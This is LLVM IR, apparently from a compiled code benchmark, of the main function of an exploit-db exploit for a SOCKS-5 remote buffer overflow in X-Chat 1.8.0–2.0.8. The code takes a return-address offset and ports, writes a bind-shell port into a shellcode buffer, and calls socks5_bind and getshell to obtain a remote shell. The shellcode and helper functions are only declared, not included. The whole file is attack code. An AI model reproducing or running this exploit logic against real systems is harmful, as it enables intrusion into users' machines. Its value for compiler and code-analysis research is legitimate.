; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_296.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_296.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DFLPORT = common dso_local global i16 0, align 2
@DFLSPRT = common dso_local global i16 0, align 2
@BSEADDR = common dso_local global i32 0, align 4
@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"BUFSIZE must be 1-255(char/int8).\00", align 1
@.str.1 = private unnamed_addr constant [126 x i8] c"[*] X-Chat[v1.8.0-v2.0.8]: socks-5 remote buffer overflow exploit.\0A[*] by: by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [58 x i8] c"[!] syntax: %s <offset from 0x%.8x> [port] [shell port]\0A\0A\00", align 1
@x86_exec = common dso_local global i16* null, align 8
@.str.3 = private unnamed_addr constant [56 x i8] c"[*] eip: 0x%.8x, socks-5 port: %u, bindshell port: %u.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i16, i16* @DFLPORT, align 2
  store i16 %10, i16* %6, align 2
  %11 = load i16, i16* @DFLSPRT, align 2
  store i16 %11, i16* %7, align 2
  %12 = load i32, i32* @BSEADDR, align 4
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* @BUFSIZE, align 4
  %14 = icmp slt i32 %13, 0
  br i1 %14, label %18, label %15

15:                                               ; preds = %2
  %16 = load i32, i32* @BUFSIZE, align 4
  %17 = icmp sgt i32 %16, 255
  br i1 %17, label %18, label %20

18:                                               ; preds = %15, %2
  %19 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %20

20:                                               ; preds = %18, %15
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 2
  br i1 %23, label %24, label %31

24:                                               ; preds = %20
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = load i32, i32* @BSEADDR, align 4
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.2, i64 0, i64 0), i8* %27, i32 %28)
  %30 = call i32 @exit(i32 1) #3
  unreachable

31:                                               ; preds = %20
  %32 = load i32, i32* %4, align 4
  %33 = icmp sgt i32 %32, 1
  br i1 %33, label %34, label %41

34:                                               ; preds = %31
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  %39 = load i32, i32* %8, align 4
  %40 = sub i32 %39, %38
  store i32 %40, i32* %8, align 4
  br label %41

41:                                               ; preds = %34, %31
  %42 = load i32, i32* %4, align 4
  %43 = icmp sgt i32 %42, 2
  br i1 %43, label %44, label %50

44:                                               ; preds = %41
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @atoi(i8* %47)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %6, align 2
  br label %50

50:                                               ; preds = %44, %41
  %51 = load i32, i32* %4, align 4
  %52 = icmp sgt i32 %51, 3
  br i1 %52, label %53, label %59

53:                                               ; preds = %50
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 3
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @atoi(i8* %56)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %7, align 2
  br label %59

59:                                               ; preds = %53, %50
  %60 = load i16, i16* %7, align 2
  %61 = zext i16 %60 to i32
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  %64 = trunc i32 %63 to i16
  %65 = load i16*, i16** @x86_exec, align 8
  %66 = getelementptr inbounds i16, i16* %65, i64 20
  store i16 %64, i16* %66, align 2
  %67 = load i16, i16* %7, align 2
  %68 = zext i16 %67 to i32
  %69 = and i32 %68, 255
  %70 = trunc i32 %69 to i16
  %71 = load i16*, i16** @x86_exec, align 8
  %72 = getelementptr inbounds i16, i16* %71, i64 21
  store i16 %70, i16* %72, align 2
  %73 = load i32, i32* %8, align 4
  %74 = load i16, i16* %6, align 2
  %75 = zext i16 %74 to i32
  %76 = load i16, i16* %7, align 2
  %77 = zext i16 %76 to i32
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.3, i64 0, i64 0), i32 %73, i32 %75, i32 %77)
  %79 = load i16, i16* %6, align 2
  %80 = load i32, i32* %8, align 4
  %81 = call i8* @socks5_bind(i16 zeroext %79, i32 %80)
  store i8* %81, i8** %9, align 8
  %82 = call i32 @sleep(i32 1)
  %83 = load i8*, i8** %9, align 8
  %84 = load i16, i16* %7, align 2
  %85 = call i32 @getshell(i8* %83, i16 zeroext %84)
  %86 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @socks5_bind(i16 zeroext, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getshell(i8*, i16 zeroext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
